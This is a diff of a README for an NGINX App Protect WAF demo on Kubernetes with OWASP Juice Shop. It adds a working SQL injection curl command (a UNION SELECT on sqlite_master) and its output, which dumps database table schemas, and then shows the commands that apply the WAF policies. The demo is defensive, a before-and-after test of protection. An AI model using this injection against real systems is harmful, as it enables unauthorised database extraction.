@@ -18,42 +18,57 @@ NGINX App Protect WAF is only available with NGINX Plus. Before moving forward, 
     $ kubectl apply -f juice-shop.yaml
 ```
 
-to test:
+to test, this SQL injection commmand will extract the data from the juice-shop database:
 
-```curl -s https://owasp-juiceshop.example.com```
+```curl -s --insecure "https://owasp-juiceshop.example.com/rest/products/search?q=qwert%27))%20UNION%20SELECT%20sql,%20%272%27,%20%273%27,%20%274%27,%20%275%27,%20%276%27,%20%277%27,%20%278%27,%20%279%27%20FROM%20sqlite_master--" | python -m json.tool```
 
 Expected reponse: 
-
-```<!--
-  ~ Copyright (c) 2014-2022 Bjoern Kimminich & the OWASP Juice Shop contributors.
-  ~ SPDX-License-Identifier: MIT
-  --><!DOCTYPE html><html lang="en"><head>
-  <meta charset="utf-8">
-  <title>OWASP Juice Shop</title>
-  <meta name="description" content="Probably the most modern and sophisticated insecure web application">
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <link id="favicon" rel="icon" type="image/x-icon" href="assets/public/favicon_js.ico">
-  <link rel="stylesheet" type="text/css" href="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.css">
-  <script src="//cdnjs.cloudflare.com/ajax/libs/cookieconsent2/3.1.0/cookieconsent.min.js"></script>
-  <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/2.2.4/jquery.min.js"></script>
-  <script>
-    window.addEventListener("load", function(){
-      window.cookieconsent.initialise({
-        "palette": {
-          "popup": { "background": "#546e7a", "text": "#ffffff" },
-          "button": { "background": "#558b2f", "text": "#ffffff" }
+```json
+{
+    "data": [
+        {
+            "createdAt": "7",
+            "deletedAt": "9",
+            "deluxePrice": "5",
+            "description": "3",
+            "id": null,
+            "image": "6",
+            "name": "2",
+            "price": "4",
+            "updatedAt": "8"
         },
-        "theme": "classic",
-        "position": "bottom-right",
-        "content": { "message": "This website uses fruit cookies to ensure you get the juiciest tracking experience.", "dismiss": "Me want it!", "link": "But me wait!", "href": "https://www.youtube.com/watch?v=9PnbKL3wuH4" }
-      })});
-  </script>
-<style>.bluegrey-lightgreen-theme.mat-app-background{background-color:#303030;color:#fff}@charset "UTF-8";@media screen and (-webkit-min-device-pixel-ratio:0){}</style><link rel="stylesheet" href="styles.css" media="print" onload="this.media='all'"><noscript><link rel="stylesheet" href="styles.css"></noscript></head>
-<body class="mat-app-background bluegrey-lightgreen-theme">
-  <app-root></app-root>
-<script src="runtime.js" type="module"></script><script src="polyfills.js" type="module"></script><script src="vendor.js" type="module"></script><script src="main.js" type="module"></script>
+        {
+            "createdAt": "7",
+            "deletedAt": "9",
+            "deluxePrice": "5",
+            "description": "3",
+            "id": "CREATE TABLE `Addresses` (`UserId` INTEGER REFERENCES `Users` (`id`) ON DELETE NO ACTION ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `fullName` VARCHAR(255), `mobileNum` INTEGER, `zipCode` VARCHAR(255), `streetAddress` VARCHAR(255), `city` VARCHAR(255), `state` VARCHAR(255), `country` VARCHAR(255), `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL)",
+            "image": "6",
+            "name": "2",
+            "price": "4",
+            "updatedAt": "8"
+        },
+        {
+            "createdAt": "7",
+            "deletedAt": "9",
+            "deluxePrice": "5",
+            "description": "3",
+            "id": "CREATE TABLE `BasketItems` (`ProductId` INTEGER REFERENCES `Products` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `BasketId` INTEGER REFERENCES `Baskets` (`id`) ON DELETE CASCADE ON UPDATE CASCADE, `id` INTEGER PRIMARY KEY AUTOINCREMENT, `quantity` INTEGER, `createdAt` DATETIME NOT NULL, `updatedAt` DATETIME NOT NULL, UNIQUE (`ProductId`, `BasketId`))",
+            "image": "6",
+            "name": "2",
+            "price": "4",
+            "updatedAt": "8"
+            ....
+```
 
-</body></html>```html
+2. Now apply web app protection for the juice-shop deployment. 
 
+```
+$ kubectl apply -f app-protect/ap-banana-uds.yaml
+$ kubectl apply -f app-protect/ap-dataguard-alarm-policy.yaml
+$ kubectl apply -f app-protect/ap-logconf.yaml
+$ kubectl apply -f app-protect/waf.yaml
+$ kubectl apply -f app-protect/juice-shop-vs.yaml
 
 For a full walk through of the demo please see the [webinar] (#https://www.nginx.com/resources/webinars/secure-your-kubernetes-apps-from-attacks-with-nginx/)
+
